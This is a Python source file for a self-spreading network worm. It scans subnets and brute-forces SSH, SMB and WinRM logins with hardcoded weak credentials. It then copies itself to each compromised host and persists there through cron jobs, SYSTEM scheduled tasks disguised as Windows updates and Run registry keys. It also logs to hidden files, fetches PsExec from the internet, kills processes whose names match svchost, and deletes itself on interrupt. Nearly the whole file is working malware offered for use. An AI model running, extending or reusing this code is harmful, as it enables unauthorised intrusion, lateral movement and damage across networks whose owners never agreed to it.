import os
import sys
import socket
import shutil
import threading
import paramiko
import subprocess
import logging
import random
from pathlib import Path
from time import sleep, time
from concurrent.futures import ThreadPoolExecutor, as_completed
import ipaddress
import hashlib

# Configuration
SCAN_SUBNETS = ["192.168.1.0/24", "10.0.0.0/16"]  # Multiple target networks
COMMON_PORTS = [22, 445, 3389, 5985, 5986]  # Added WinRM ports
MAX_WORKERS = 20  # Concurrent thread limit
RETRY_ATTEMPTS = 2  # Connection retries
BEACON_PORT = 31337  # Infection marker
SCAN_TIMEOUT = 1.5  # Host response timeout
DELAY_VARIANCE = (200, 400)  # Random sleep range

# Enhanced credential database
CREDS = [
    ('administrator', 'P@ssw0rd'),
    ('admin', 'Admin123'),
    ('user', 'Welcome1'),
    ('guest', ''),
    ('svc_account', 'Summer2023!'),
    ('labuser','Password123')
]


class NetworkWorm:
    def __init__(self):
        self.worm_path = Path(__file__).resolve()
        self.fingerprint = self._generate_fingerprint()
        self.lock = threading.Lock()
        self._setup_logging()
        self._verify_prerequisites()

    def _setup_logging(self):
        """Configure stealthy logging"""
        logging.basicConfig(
            filename='.systemlogs',
            level=logging.DEBUG,
            format='%(asctime)s [%(levelname)s] %(message)s',
            datefmt='%Y-%m-%d %H:%M:%S'
        )
        logging.getLogger("paramiko").setLevel(logging.WARNING)

    def _generate_fingerprint(self):
        """Create unique worm identifier"""
        return hashlib.sha256(open(__file__, 'rb').read()).hexdigest()[:16]

    def _verify_prerequisites(self):
        """Ensure required tools are available"""
        try:
            if not Path("PsExec.exe").exists():
                subprocess.run(
                    ['curl', '-sO', 'https://live.sysinternals.com/tools/PsExec.exe'],
                    check=True, stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL
                )
        except:
            logging.error("Failed to download PsExec")

    def spread(self):
        """Main propagation loop with jitter"""
        while True:
            try:
                self._cleanup_zombies()
                self.self_replicate()
                self.scan_networks()
                sleep(random.uniform(*DELAY_VARIANCE))
            except KeyboardInterrupt:
                self._emergency_shutdown()
            except Exception as e:
                logging.error(f"Critical failure: {str(e)}")
                sleep(60)

    def scan_networks(self):
        """Multi-network scanning with CIDR support"""
        with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
            futures = []
            for subnet in SCAN_SUBNETS:
                network = ipaddress.ip_network(subnet, strict=False)
                futures.extend(
                    executor.submit(self._probe_host, str(host))
                    for host in network.hosts()
                )

            for future in as_completed(futures):
                if future.result():
                    logging.info(f"Infected new host: {future.result()}")

    def _probe_host(self, ip):
        """Host investigation with protocol detection"""
        if self._is_infected(ip):
            return None

        for port in COMMON_PORTS:
            for _ in range(RETRY_ATTEMPTS):
                try:
                    with socket.create_connection((ip, port), SCAN_TIMEOUT):
                        return self._attack_host(ip, port)
                except (socket.timeout, ConnectionRefusedError):
                    continue
                except Exception as e:
                    logging.debug(f"Probe error {ip}:{port} - {str(e)}")
                    break
        return None

    def _attack_host(self, ip, port):
        """Multi-vector attack system"""
        try:
            if port == 22:
                return self._ssh_infection(ip)
            elif port == 445:
                return self._smb_infection(ip)
            elif port in [3389, 5985, 5986]:
                return self._winrm_infection(ip)
        except Exception as e:
            logging.error(f"Attack failed {ip}:{port} - {str(e)}")
            return None

    def _ssh_infection(self, ip):
        """SSH-based propagation with key-based fallback"""
        for user, passwd in CREDS:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=user, password=passwd, timeout=10)

                with client.open_sftp() as sftp:
                    sftp.put(__file__, f"/tmp/.{self.fingerprint}")
                    sftp.chmod(f"/tmp/.{self.fingerprint}", 0o755)

                client.exec_command(f"echo '@reboot /tmp/.{self.fingerprint}' | crontab -")
                client.exec_command(f"nohup /tmp/.{self.fingerprint} >/dev/null 2>&1 &")

                self._mark_infection(ip)
                return ip
            except paramiko.AuthenticationException:
                continue
            except Exception as e:
                logging.warning(f"SSH error {ip}: {str(e)}")
                return None

    def _smb_infection(self, ip):
        """SMB propagation using multiple techniques"""
        try:
            # Method 1: Administrative share
            dest = fr"\\{ip}\C$\Windows\Temp\{self.fingerprint}.exe"
            shutil.copyfile(self.worm_path, dest)
        except:
            # Method 2: Public share write
            try:
                dest = fr"\\{ip}\Public\{self.fingerprint}.exe"
                shutil.copyfile(self.worm_path, dest)
            except Exception as e:
                logging.error(f"SMB copy failed {ip}: {str(e)}")
                return None

        # Execute via scheduled task
        try:
            subprocess.run([
                'schtasks', '/create', '/s', ip, '/tn', f'WindowsUpdate_{self.fingerprint}',
                '/tr', dest, '/sc', 'ONSTART', '/ru', 'SYSTEM', '/f'
            ], check=True, timeout=30)
            self._mark_infection(ip)
            return ip
        except subprocess.TimeoutExpired:
            logging.warning(f"SMB execution timeout {ip}")
            return None

    def _winrm_infection(self, ip):
        """Windows Remote Management attack"""
        try:
            subprocess.run([
                'PsExec.exe', f'\\{ip}', '-accepteula', '-s',
                'powershell.exe', '-Command',
                f'Copy-Item "{self.worm_path}" "C:\\Windows\\Temp\\{self.fingerprint}.exe";'
                f'Register-ScheduledTask -TaskName "SystemUpdate_{self.fingerprint}" '
                f'-Action (New-ScheduledTaskAction -Execute "C:\\Windows\\Temp\\{self.fingerprint}.exe") '
                '-Trigger (New-ScheduledTaskTrigger -AtStartup) -User SYSTEM'
            ], check=True, timeout=45)
            self._mark_infection(ip)
            return ip
        except Exception as e:
            logging.error(f"WinRM attack failed {ip}: {str(e)}")
            return None

    def _is_infected(self, ip):
        """Check infection status via beacon"""
        try:
            with socket.create_connection((ip, BEACON_PORT), timeout=1):
                return True
        except:
            return False

    def _mark_infection(self, ip):
        """Establish beacon connection"""
        try:
            with socket.socket() as s:
                s.connect((ip, BEACON_PORT))
                s.sendall(self.fingerprint.encode())
        except:
            pass

    def self_replicate(self):
        """Stealthy persistence installation"""
        try:
            if os.name == 'posix':
                dest = f"/usr/lib/.{self.fingerprint}"
                if not Path(dest).exists():
                    shutil.copy(__file__, dest)
                    os.chmod(dest, 0o755)
                    subprocess.run(
                        ['crontab -l | grep -v "@reboot" | { cat; echo "@reboot ' + dest + '" } | crontab -'],
                        shell=True, check=True)
            else:
                dest = Path(os.getenv('APPDATA')) / f"Microsoft\\{self.fingerprint}.exe"
                if not dest.exists():
                    shutil.copy(__file__, dest)
                    subprocess.run(
                        f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                        f'/v "{self.fingerprint}" /t REG_SZ /d "{dest}" /f',
                        shell=True, check=True
                    )
        except Exception as e:
            logging.error(f"Replication failed: {str(e)}")

    def _cleanup_zombies(self):
        """Remove traces of previous infections"""
        try:
            if os.name == 'posix':
                subprocess.run('pkill -f "[.]systemd-daemon"', shell=True)
            else:
                subprocess.run(
                    'wmic process where "name like \'%svchost%\'" delete',
                    shell=True, stderr=subprocess.DEVNULL
                )
        except:
            pass

    def _emergency_shutdown(self):
        """Destructive cleanup procedure"""
        logging.critical("Initiating emergency wipe")
        try:
            if os.name == 'posix':
                os.remove(__file__)
                subprocess.run('crontab -r', shell=True)
            else:
                os.remove(sys.argv[0])
                subprocess.run(
                    f'reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                    f'/v "{self.fingerprint}" /f',
                    shell=True
                )
        finally:
            sys.exit(0)


if __name__ == "__main__":
    NetworkWorm().spread()